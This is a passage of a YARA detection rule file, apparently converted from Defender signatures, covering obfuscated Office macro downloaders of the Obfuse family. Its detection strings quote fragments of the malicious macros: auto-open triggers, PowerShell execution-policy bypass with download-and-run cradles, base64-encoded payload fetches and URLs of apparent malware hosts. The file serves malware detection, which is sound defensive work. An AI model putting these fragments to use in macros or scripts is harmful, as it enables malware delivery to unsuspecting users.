        threat_id = "2147836734"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(\"wscript.shell\")endfunction" ascii //weight: 1
        $x_1_2 = "auto_close()l__66$endsub" ascii //weight: 1
        $x_1_3 = "allfault.execxyzt+l_o4+l_o5endfunction" ascii //weight: 1
        $x_1_4 = "l_o5=\"pass-nop-w1;i'e'x(iwr('http" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CPD_2147836786_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CPD!MTB"
        threat_id = "2147836786"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 63 68 72 28 35 30 29 2b 63 68 72 28 34 38 29 2b 63 68 72 28 34 38 29 [0-3] 77 73 68 73 68 65 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b [0-100] 28 22 5c [0-10] 2e 22 29 [0-100] 2e 6f 70 65 6e 22 67 65 74 22 2c 00 28 22 68 3a 2f 2f 6a 2d 68 6c 67 2e 6d 2f 77 2f 71 7a 67 68 6a 6b 64 68 64 67 2e 22 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b [0-100] 28 22 5c [0-10] 2e 22 29 [0-100] 2e 6f 70 65 6e 22 67 65 74 22 2c 00 28 22 68 3a 2f 2f 6a 2d 68 6c 67 2e 6d 2f 76 2f 68 67 6a 6a 64 68 64 67 2e 22 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBP_2147836825_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBP!MTB"
        threat_id = "2147836825"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=reversedtext&mid(text,(length-z),1)next" ascii //weight: 1
        $x_1_2 = "createobject(\"wscript.shell\")specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = {2e 6f 70 65 6e 22 67 65 74 22 2c [0-200] 28 22 [0-100] 22 29 2c 66 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBQ_2147837126_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBQ!MTB"
        threat_id = "2147837126"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "powershell-nop-epbypass-c(\"+\"i\"+\"'\"+\"w\"+\"'\"+\"r\"+\"('\"alo2=\"http" ascii //weight: 1
        $x_1_2 = "=getobject(\"new:f935dc22-1cf0-11d0-adb9-00c04fd58a0b\")meinkonhun.execalo3endsub" ascii //weight: 1
        $x_1_3 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBN_2147837470_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBN!MTB"
        threat_id = "2147837470"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-15] 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 [0-15] 28 22 [0-36] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBR_2147837744_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBR!MTB"
        threat_id = "2147837744"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "getobject(nutff(\"146132137136130136143142085\"))" ascii //weight: 1
        $x_1_2 = "activedocument.name<>nutff(\"076076073127138126\")" ascii //weight: 1
        $x_1_3 = "chr(beets-27)endfunction" ascii //weight: 1
        $x_1_4 = "loopwhilelen(milk)>0nutff=oatmilkendfunction" ascii //weight: 1
        $x_1_5 = "autoopen()mymacroendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBS_2147838066_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBS!MTB"
        threat_id = "2147838066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {67 65 74 6f 62 6a 65 63 74 28 22 77 [0-20] 3a 22 29 2e 67 65 74 28 6d 69 64 28 73 74 72 61 72 67 2c 31 2c 31 33 29 29 2e 63 72 65 61 74 65 6d 69 64 28 73 74 72 61 72 67 2c 31 34 29}  //weight: 1, accuracy: Low
        $x_1_2 = "poil(\"362473315410268369466318413462256307359405505360459\")" ascii //weight: 1
        $x_1_3 = "=chr(cint(c)-256)" ascii //weight: 1
        $x_1_4 = "autoopen()anus_de_culendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBT_2147838278_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBT!MTB"
        threat_id = "2147838278"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 67 65 74 22 2c 20 4b 68 69 68 69 62 69 66 67 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ASM_2147839071_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ASM!MTB"
        threat_id = "2147839071"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {66 6a 64 6a 6b 61 73 66 20 3d 20 22 [0-5] 6a 64 73 6c 61 64 6b 66 22}  //weight: 1, accuracy: Low
        $x_1_2 = "fjdjkasf = Left(fjdjkasf, 5)" ascii //weight: 1
        $x_1_3 = {64 6a 66 65 69 68 66 69 64 6b 61 73 6c 6a 66 2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 64 66 67 64 66 6a 69 65 6a 66 6a 64 73 68 61 6a 2c 20 [0-31] 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = "Set djfeihfidkasljf = CreateObject(\"Shell.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BSM_2147839488_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BSM!MTB"
        threat_id = "2147839488"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call T8.run(hn & m & \"32 \" + D)" ascii //weight: 1
        $x_1_2 = "Public Const D As String = \"Ub.pdf\"" ascii //weight: 1
        $x_1_3 = "Ot = Ot & Chr(pp(Fa) Xor 1)" ascii //weight: 1
        $x_1_4 = "frm.download Kr, D" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_DPD_2147839847_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.DPD!MTB"
        threat_id = "2147839847"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)dimwshshellasobjectdimgetuserdesktop" ascii //weight: 1
        $x_1_2 = {3d 6f 62 6a 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-15] 22 29 64 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 67 65 74 75 73 65 72 64 65 73 6b 74 6f 70 2b [0-15] 28 22 [0-15] 6e 6e 22 29 [0-200] 2e 6f 70 65 6e 22 67 65 74 22 2c 00 28}  //weight: 1, accuracy: Low
        $x_1_4 = {26 63 68 72 28 61 73 63 28 6d 69 64 28 [0-200] 2c [0-200] 2c 31 29 29 2d 31 33 29 6e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBRE_2147840429_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBRE!MTB"
        threat_id = "2147840429"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"cmd /c start /min Pow\"" ascii //weight: 1
        $x_1_2 = "= \"erShell -ex Bypass -nO\"" ascii //weight: 1
        $x_1_3 = "= \"p -w 1 ;i'E'x(iwr\"" ascii //weight: 1
        $x_1_4 = "= \"g7xBnq/48b9365ec76138129aef695544fdd0a49d85b8f3/files/p000start') -useB); St\"" ascii //weight: 1
        $x_1_5 = "= \"art-Sleep -Sec\"" ascii //weight: 1
        $x_1_6 = "= Car1 + Car2 + Car3 + Car4 + Car5 + Car6" ascii //weight: 1
        $x_1_7 = "Shell i_openheartthing" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBU_2147840955_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBU!MTB"
        threat_id = "2147840955"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 22 67 65 74 22 2c 20 [0-15] 28 22 [0-100] 22 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = {43 68 72 28 41 73 63 28 4d 69 64 28 [0-200] 2c 20 [0-200] 2c 20 31 29 29 20 2d 20 31 33 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Chr(50) + Chr(48) + Chr(48)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBV_2147844485_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBV!MTB"
        threat_id = "2147844485"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=appdata&chr(asc(c)-1)nexttjniubiof=appdataendfunction" ascii //weight: 1
        $x_1_2 = "instr(,mid(,g,1))if>0then=mid(,,1)=+else=+mid(,g,1)" ascii //weight: 1
        $x_1_3 = "=strreverse(enc)forv=1tolen(enc)c=mid(enc,_v,_1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBW_2147848134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBW!MTB"
        threat_id = "2147848134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-esqbfafgaiaagacgatgblahcalqbpagiaagblagmadaagae4azqb0ac4avwblagiaqwbsagkazqbuahqakqauaeqabwb3ag4ababvageazabtahqacgbpag4azwauaekabgb2ag8aawblacgajwanaaoaaab0ahqacabzadoalwava" ascii //weight: 1
        $x_1_2 = "=\"w\":er=\"s\":ty=\"c\":ui=\"r\":df=\"i\":gh=\"p\"" ascii //weight: 1
        $x_1_3 = "=createobject(xqmcrk)alxz.run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PBRF_2147848461_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PBRF!MTB"
        threat_id = "2147848461"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 22 64 7a 30 6e 68 6c 6a 31 71 38 61 63 33 2e 63 6c 6f 75 64 66 72 6f 6e 74 2e 6e 65 74 22 6d 65 74 68 6f 64 3d 22 (68 74|68 74 74) 22 66 69 6c 65 6e 61 6d 65 3d 22 6d 61 6c 77 61 72 65 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = "url=method+\"://\"+host+\"/\"+filenamelocal" ascii //weight: 1
        $x_1_3 = "filepath=\"c:\\windows\\tasks\\\"+filename" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PREF_2147848611_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PREF!MTB"
        threat_id = "2147848611"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SQBFAFgAIAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAuAEkAbgB2AG8AawBlACgAJwANAAoAaAB0AHQAcA" ascii //weight: 1
        $x_1_2 = "BzADoALwAvAGUAbgBjAHUAcgB0AGEAZABvAHIALgBjAG8AbQAuAGIAcgAvAG4AdABFAEcAVQANAAoAJwApADsAIAANAAoAcABJAGgAWQBrAFMARwBEAEEASwBBAEgARABGAEQARQBOAEUAYQBQAEIAYQBQAEoAZgBo" ascii //weight: 1
        $x_1_3 = "if.execute>0thenforlcount=1to.foundfiles.countsetwbresults=workbooks.open(filename:=.foundfiles(lcount),updatelinks:=0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PREG_2147849014_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PREG!MTB"
        threat_id = "2147849014"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "subauto_open()dimshellasobjectdimcommandasstring'specifythepowershellcommandyouwanttoruncommand=\"get-process\"'createanewshellobjectsetshell=createobject(\"wscript.shell\")'" ascii //weight: 1
        $x_1_2 = {6f 70 65 6e 70 6f 77 65 72 73 68 65 6c 6c 61 6e 64 72 75 6e 74 68 65 63 6f 6d 6d 61 6e 64 73 68 65 6c 6c 2e 72 75 6e 22 70 6f 77 65 72 73 68 65 6c 6c 26 70 6f 77 65 72 73 68 65 6c 6c 28 6e 73 6c 6f 6f 6b 75 70 2d 71 3d 74 78 74 [0-15] 2e 61 62 65 6e 61 2d 64 6b 2e 63 61 6d 29 5b 2d 31 5d 2d 6e 6f 6e 65 77 77 69 6e 64 6f 77 22 2c 30 2c 66 61 6c 73 65 27 72 65 6c 65 61 73 65 74 68 65 73 68 65 6c 6c 6f 62 6a 65 63 74 73 65 74 73 68 65 6c 6c 3d 6e 6f 74 68 69 6e 67 65 6e 64 73 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBX_2147888308_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBX!MTB"
        threat_id = "2147888308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 22 66 79 66 2f [0-75] 2f 70 73 66 65 62 6e 70 75 74 6a 73 62 77 66 74 66 75 73 70 71 74 6f 62 73 75 2f 78 78 78 30 30 3b 74 71 75 75 69 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 73 74 72 72 65 76 65 72 73 65 28 65 6e 63 29 66 6f 72 ?? 3d 31 74 6f 6c 65 6e 28 65 6e 63 29 ?? 3d 6d 69 64 28 65 6e 63 2c ?? 2c 31 29 61 70 70 64 61 74 61 3d 61 70 70 64 61 74 61 26 63 68 72 28 61 73 63 28 ?? 29 2d 31 29 6e 65 78 74 [0-10] 64 65 63 72 79 70 74 ?? ?? ?? ?? ?? ?? 3d 61 70 70 64 61 74 61 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {64 65 63 72 79 70 74 ?? ?? ?? ?? ?? ?? 28 22 66 79 66 2f ?? ?? ?? ?? 22 29 [0-75] 3d 65 6e 76 69 72 6f 6e 24 28 22 61 70 70 64 61 74 61 22 29 26 22 5c 22}  //weight: 1, accuracy: Low
        $x_1_4 = "subworkbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBY_2147888887_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBY!MTB"
        threat_id = "2147888887"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 22 70 22 3a [0-30] 3d 22 6f 22 3a [0-30] 3d 22 77 22 3a [0-30] 3d 22 65 22 3a [0-30] 3d 22 72 22 3a [0-30] 3d 22 73 22 3a [0-30] 3d 22 68 22 3a [0-30] 3d 22 65 22 3a [0-30] 3d 22 6c 22 3a [0-30] 3d 22 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = "-esqbfafgaiaagacgatgblahcalqbpagiaagblagmadaagae4azqb0ac4avwblagiaqwbsagkazqbuahqakqauaeqabwb3ag4ababvageazabtahqacgbpag4azwauaekabgb2ag8aawblacgajwanaaoaaab0ahqaca" ascii //weight: 1
        $x_1_3 = "bhvixl.runbudbaqoaydzobnojdaedugbroly,85710:" ascii //weight: 1
        $x_1_4 = "subauto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRTF_2147889456_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRTF!MTB"
        threat_id = "2147889456"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SQBFAFgAIAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAuAEkAbgB2AG8AawBlACg" ascii //weight: 1
        $x_1_2 = "AJwANAAoAaAB0AHQAcABzADoALwAvAGQAYwA1ADMANwAuADQAcwB5AG4AYwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkAC8AQgA5AEcAUABxAFYAUgAyAC8AbQBhAHMAdABlAHIALgBqAHAAZwA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVBZ_2147890363_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVBZ!MTB"
        threat_id = "2147890363"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "getobject(ottawa).createobject(chapters).runfisting" ascii //weight: 1
        $x_1_2 = "chr((7*2)+(((10-4)*2)*2))&chr((((16/2)*2)+(4*5))*2)&mid(introduce,i+1,2)i=i+2" ascii //weight: 1
        $x_1_3 = "workbook_open()florencemills(sheets(\"l747f\").range(\"e150\").value)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCA_2147891208_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCA!MTB"
        threat_id = "2147891208"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "getobject(florist).createobject(earrings).runhouseholds" ascii //weight: 1
        $x_1_2 = "=chr((7*2)+(((10-4)*2)*2))&chr((((16/2)*2)+(4*5))*2)&mid(nurses,i+1,2)i=i+2" ascii //weight: 1
        $x_1_3 = "workbook_open()democratsminneapolis(sheets(\"f2ca\").range(\"h182\").value)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVCC_2147891657_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVCC!MTB"
        threat_id = "2147891657"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=strreverse(enc)forq=1tolen(enc)e=mid(enc,q,1)appdata=temp&chr(asc(e)-1)next" ascii //weight: 1
        $x_1_2 = ".open\"get\",jnbihbnilbjhvgfvghb(\"q~~zg<<fa;>bc;?b@;cegbcdf<tprp}vpx}u~qx}<t}urtptqrtq}rqtrutqp~tqpp|t}pqoptop<};nn\")" ascii //weight: 1
        $x_1_3 = "=createobject(\"wscript.shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RPI_2147894730_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RPI!MTB"
        threat_id = "2147894730"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fori1tolenxdecrypteddecryptedchrascmidxi1xorkeynexti" ascii //weight: 1
        $x_1_2 = "createobjectwscriptshellrundecrypted0endsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RPI_2147894730_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RPI!MTB"
        threat_id = "2147894730"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
